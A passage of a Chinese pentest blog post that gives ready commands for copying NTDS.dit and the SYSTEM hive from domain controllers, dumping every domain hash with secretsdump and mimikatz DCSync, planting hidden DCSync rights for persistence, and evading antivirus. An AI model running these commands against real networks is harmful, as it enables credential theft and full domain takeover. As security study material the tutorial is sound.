<h3 id="利用VSS导出"><a href="#利用VSS导出" class="headerlink" title="利用VSS导出"></a>利用VSS导出</h3><p>VSS全称为Volume Shadow Copy Service，卷影拷贝服务，属于快照技术的一种，主要用于备份和恢复，即使文件处于被锁定状态。</p>
<p>其获取NTDS.DIT的基本步骤为：</p>
<p>创建目标主机所有文件的卷影拷贝。<br>在创建的卷影拷贝中复制出NTDS.DIT。<br>删除卷影拷贝。</p>
<h4 id="VSSADMIN"><a href="#VSSADMIN" class="headerlink" title="VSSADMIN"></a>VSSADMIN</h4><p>vssadmin是windows上一个命令行卷影拷贝服务管理工具。其适用于： Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165404714.png" alt="image-20210729165404714"></p>
<p>其导出NTDS.DIT的方法如下</p>
<p>创建一个C盘的卷影拷贝</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow &#x2F;for&#x3D;c:</span><br></pre></td></tr></table></figure>


<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165602611.png" alt="image-20210729165602611"></p>
<p>然后将卷影中的ntds.dit复制出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure>
<p>然后删除卷影</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet</span><br></pre></td></tr></table></figure>
<h4 id="Ntdsutil-exe"><a href="#Ntdsutil-exe" class="headerlink" title="Ntdsutil.exe"></a>Ntdsutil.exe</h4><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。</p>
<p>为WINDOWS上所有文件创建快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170339152.png" alt="image-20210729170339152"></p>
<p>我们得到了个快照的ID，接下来我们就需要加载这个卷影到我们的磁盘中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
<p>执行后就会发现这个快照加载到了C盘下（这里dir看到的NTDS.DIT与本次实验无关，是上次实验残留下来没删的）</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170830331.png" alt="image-20210729170830331"></p>
<p>然后将ntds.dit复制出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy c:\$SNAP_202107291703_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
<p>然后删除快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; &quot;delete &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
<p>同时，NTDSUTIL还有一个更加便捷的导出ntds.dit的方法：通过IFM<br>IFM中文叫媒体安装集，在我们通过NTDSUTIL来创建媒体安装集时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，需管理员权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q </span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729171538273.png" alt="image-20210729171538273"></p>
<p>然后在C:\test\Active Directory\ntds.dit，就是NTDS.DIT，我们复制出来就行了。<br>然后再把test文件夹删除即可。</p>
<h3 id="解析NTDS-DIT"><a href="#解析NTDS-DIT" class="headerlink" title="解析NTDS.DIT"></a>解析NTDS.DIT</h3><p>在提取NTDS.DIT后，我们需要再提取一个文件system.hive，因为system.hive中存放着NTDS.DIT的密钥，有了它我们才能解析NTDS.DIT。</p>
<p>可以用刚刚提到的VSS方法获取，也可以直接用以下命令从注册表中拉取.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure>
<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>impacket框架集成了许多好玩的东西，他其中的secretdump.py脚本实现了解析ntds.dit的功能</p>
<p>直接再impacket的example下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\secretsdump.py -system .\system.hive -ntds .\ntds.dit local</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729235923711.png" alt="image-20210729235923711"></p>
<h3 id="远程解析"><a href="#远程解析" class="headerlink" title="远程解析"></a>远程解析</h3><h4 id="DCSYNC"><a href="#DCSYNC" class="headerlink" title="DCSYNC"></a>DCSYNC</h4><p>“DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。”</p>
<p>这个东西 可以实现不登录到域控而获取域控上的数据<br>获得以下权限就可以使用了</p>
<ul>
<li>Administrators组内的用户</li>
<li>Domain Admins组内的用户</li>
<li>Enterprise Admins组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<p>然后在mimikatz里<br>privilege::debug<br>lsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可</p>
<p>想获取全部hash也可以lsadump::dcsync /domain:xxx.com /all /csv</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png" alt="QQ截图20210217133813"></p>
<p>然后我们就可以通过krbtgt hash制作黄金票据登录administrator。<br>如果还想隐蔽一点，可以给普通用户添加如下ACE,使其获得dcsync权限</p>
<ul>
<li></li>
<li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
<li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
<li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
</ul>
<p>可以以管理员权限运行powerview.ps1完成以上操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#给域用户hack添加以上三条ACE</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#给域用户hack删除以上三条ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>
<p>然后普通用户也可以用mimikatz调用dcsync导出hash了</p>
<h4 id="DCSYNC的powershell实现"><a href="#DCSYNC的powershell实现" class="headerlink" title="DCSYNC的powershell实现"></a>DCSYNC的powershell实现</h4><p>mimikatz免杀过不去的话可以试试这个<a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    &#x2F;&#x2F; 导出域内所有用户的hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      &#x2F;&#x2F; 导出域内administrator账户的hash</span><br></pre></td></tr></table></figure>
<p>我这里WIN10域控打不通，不知道为啥</p>
<h5 id="配合EXCHANGE用户达到域提权目的"><a href="#配合EXCHANGE用户达到域提权目的" class="headerlink" title="配合EXCHANGE用户达到域提权目的"></a>配合EXCHANGE用户达到域提权目的</h5><p>前提:一个exchange高权限组的用户控制权，一个机器账户</p>
<p>exchange安装后会在AD上生成两个容器</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png" alt="QQ截图20210217141602"></p>
<p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。<br>其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png" alt="QQ截图20210217141614"></p>
<p>假设我们已经拿到了exchange trusted subsystem中一个用户的控制权。<br>那么就可用dysync进行权限维持了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ConsT27</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/">http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://const27.com" target="_blank">ConsT27's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">内网渗透与权限维持</a></div><div class="post_share"><div class="social-share" data-image="https://const27blog.oss-cn-beijing.aliyuncs.com/img/cv.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" target="_blank"><img class="post-qr-code-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/06/28/Bypass%20UAC/"><img class="prev-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bz.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BypassUAC技术总结</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/"><img class="next-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bd.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">windows内网基础</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/06/28/ARP欺骗&DNS欺骗&mac泛洪攻击/" title="ARP欺骗&DNS欺骗&mac泛洪攻击"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bw.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">ARP欺骗&DNS欺骗&mac泛洪攻击</div></div></a></div><div><a href="/2021/06/28/Windows内网基础概览/" title="windows内网基础"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bd.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">windows内网基础</div></div></a></div><div><a href="/2021/09/03/windows内网渗透常用命令总汇/" title="Windows内网渗透常用命令总汇"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/kp.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-03</div><div class="title">Windows内网渗透常用命令总汇</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">V</span><span class="switch-btn"></span><span class="second-comment">a</span></div></div><div class="comment-wrap"><div></div><div></div><div></div><div></div><div></div><div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH"><span class="toc-number">1.1.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KB2871997"><span class="toc-number">1.1.1.</span> <span class="toc-text">KB2871997</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EKB2871997%E7%9A%84%E4%B8%80%E4%B8%AA%E8%AF%AF%E8%A7%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">关于KB2871997的一个误解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HASH%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.3.</span> <span class="toc-text">HASH获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB-PTH-%EF%BC%88Pass-the-Hash"><span class="toc-number">1.1.4.</span> <span class="toc-text">hash 传递攻击 PTH （Pass the Hash)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS14-068"><span class="toc-number">1.2.</span> <span class="toc-text">MS14-068</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-number">1.2.1.</span> <span class="toc-text">PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14068"><span class="toc-number">1.2.2.</span> <span class="toc-text">MS14068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#M14068%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">M14068利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberoast"><span class="toc-number">1.3.</span> <span class="toc-text">kerberoast</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-get-SPN"><span class="toc-number">1.3.1.</span> <span class="toc-text">How to get SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-get-HASH"><span class="toc-number">1.3.2.</span> <span class="toc-text">How to get HASH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-export-hash"><span class="toc-number">1.3.3.</span> <span class="toc-text">How to export hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-crack-HASH"><span class="toc-number">1.3.4.</span> <span class="toc-text">How to crack HASH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-use-Kerberoast"><span class="toc-number">1.3.5.</span> <span class="toc-text">How to use Kerberoast</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roast"><span class="toc-number">1.4.</span> <span class="toc-text">AS_REP Roast</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-get-HASH-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">How to get HASH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-crack-hash"><span class="toc-number">1.4.2.</span> <span class="toc-text">How to crack hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.</span> <span class="toc-text">委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">域委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">非约束性委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">约束性委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">基于资源的约束性委派</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.2.</span> <span class="toc-text">非约束性委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%9B%E8%A1%8C%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%B4%A6%E6%88%B7%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">1.进行非约束性委派账户扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">2.非约束性委派的攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E9%85%8D%E5%90%88-Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">3.非约束性委派配合 Spooler打印机服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.3.</span> <span class="toc-text">约束性委派的攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE-1"><span class="toc-number">1.5.4.</span> <span class="toc-text">基于资源的约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%9A%84%E5%87%A0%E4%B8%AA%E7%82%B9%EF%BC%9A"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">原理的几个点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">攻击流程:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">实操</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E7%94%A8%E6%88%B7%E4%B8%8D%E5%8F%AF%E5%A7%94%E6%B4%BE%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.4.4.</span> <span class="toc-text">敏感用户不可委派的绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#credssp-%E5%AF%BC%E5%87%BA%E7%94%A8%E6%88%B7%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.6.</span> <span class="toc-text">credssp 导出用户明文密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-1"><span class="toc-number">1.6.2.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tscon%E6%A8%AA%E5%90%91"><span class="toc-number">1.7.</span> <span class="toc-text">tscon横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8COM-DCOM%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.8.</span> <span class="toc-text">利用COM&#x2F;DCOM对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.8.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MMC20-APPLICATION-1"><span class="toc-number">1.8.2.</span> <span class="toc-text">MMC20.APPLICATION.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ipc"><span class="toc-number">1.9.</span> <span class="toc-text">ipc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ipc%E7%AE%80%E4%BB%8B"><span class="toc-number">1.9.1.</span> <span class="toc-text">ipc简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ipc%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.9.2.</span> <span class="toc-text">利用ipc横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#at"><span class="toc-number">1.9.2.1.</span> <span class="toc-text">at</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#schtasks"><span class="toc-number">1.9.2.2.</span> <span class="toc-text">schtasks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sc"><span class="toc-number">1.9.2.3.</span> <span class="toc-text">sc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wmi"><span class="toc-number">1.10.</span> <span class="toc-text">wmi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec"><span class="toc-number">1.10.1.</span> <span class="toc-text">wmiexec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winrm"><span class="toc-number">1.11.</span> <span class="toc-text">winrm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">1.12.</span> <span class="toc-text">利用组策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E8%84%9A%E6%9C%AC%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.12.1.</span> <span class="toc-text">读取脚本中的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%AF%86%E7%A0%81"><span class="toc-number">1.12.2.</span> <span class="toc-text">批量密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E7%AE%A1%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.</span> <span class="toc-text">域管权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hook-PasswordChangeNotify"><span class="toc-number">2.1.</span> <span class="toc-text">Hook PasswordChangeNotify</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">SSP注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SID-History%E5%90%8E%E9%97%A8"><span class="toc-number">2.4.</span> <span class="toc-text">SID History后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DSRM%E5%90%8E%E9%97%A8"><span class="toc-number">2.5.</span> <span class="toc-text">DSRM后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E5%90%8E%E9%97%A8"><span class="toc-number">2.6.</span> <span class="toc-text">委派后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%94%9F%E6%88%90"><span class="toc-number">2.7.</span> <span class="toc-text">黄金票据生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AdminSDHolder"><span class="toc-number">2.8.</span> <span class="toc-text">AdminSDHolder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ntds-dit"><span class="toc-number">2.9.</span> <span class="toc-text">Ntds.dit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8VSS%E5%AF%BC%E5%87%BA"><span class="toc-number">2.9.1.</span> <span class="toc-text">利用VSS导出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#VSSADMIN"><span class="toc-number">2.9.1.1.</span> <span class="toc-text">VSSADMIN</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ntdsutil-exe"><span class="toc-number">2.9.1.2.</span> <span class="toc-text">Ntdsutil.exe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90NTDS-DIT"><span class="toc-number">2.9.2.</span> <span class="toc-text">解析NTDS.DIT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Impacket"><span class="toc-number">2.9.2.1.</span> <span class="toc-text">Impacket</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%A7%A3%E6%9E%90"><span class="toc-number">2.9.3.</span> <span class="toc-text">远程解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DCSYNC"><span class="toc-number">2.9.3.1.</span> <span class="toc-text">DCSYNC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DCSYNC%E7%9A%84powershell%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.9.3.2.</span> <span class="toc-text">DCSYNC的powershell实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E5%90%88EXCHANGE%E7%94%A8%E6%88%B7%E8%BE%BE%E5%88%B0%E5%9F%9F%E6%8F%90%E6%9D%83%E7%9B%AE%E7%9A%84"><span class="toc-number">2.9.3.2.1.</span> <span class="toc-text">配合EXCHANGE用户达到域提权目的</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By ConsT27</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">怀念那一刹耀眼的火花</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script 